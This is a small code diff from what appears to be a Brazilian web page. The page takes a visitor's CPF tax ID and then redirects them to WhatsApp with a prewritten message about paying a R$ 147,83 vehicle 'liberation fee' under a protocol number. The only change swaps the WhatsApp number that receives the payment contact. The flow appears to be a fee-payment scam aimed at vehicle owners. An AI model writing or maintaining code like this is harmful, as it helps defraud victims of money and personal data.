@@ -197,7 +197,7 @@ if (cpfInput && cpfSubmit && consultaChat) {
           const whatsappMessage =
             "Olá, já enviei meus documentos e gostaria de *realizar o pagamento da guia de liberação* " +
             "no valor de *R$ 147,83*, referente à liberação do veículo. Protocolo: *2026841285*";
-          const whatsappNumber = "5511951706840";
+          const whatsappNumber = "5511921560026";
           const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(whatsappMessage)}`;
           window.location.href = whatsappUrl;
           return;
